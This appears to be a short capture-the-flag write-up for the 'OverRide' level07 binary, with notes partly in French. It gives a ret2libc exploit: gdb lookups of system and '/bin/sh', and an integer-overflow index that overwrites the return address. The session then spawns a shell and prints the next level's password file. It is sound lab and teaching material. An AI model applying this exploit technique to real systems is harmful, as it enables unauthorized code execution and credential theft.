# LEVEL07

ESP -> 0xffffd520
EBP -> 0xffffd708
EIP <-> 114 Offset 

Ret2libc
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

find /bin/sh
```
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

```
2147483762 = 0b10000000000000000000000001110010
décalage binaire de 1 = 0000000000000000000000001110010 = 114 (offset EIP)

0xf7e6aed0 = 4159090384 (system)

0xf7f897ec = 4160264172 (/bin/sh)
```

```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```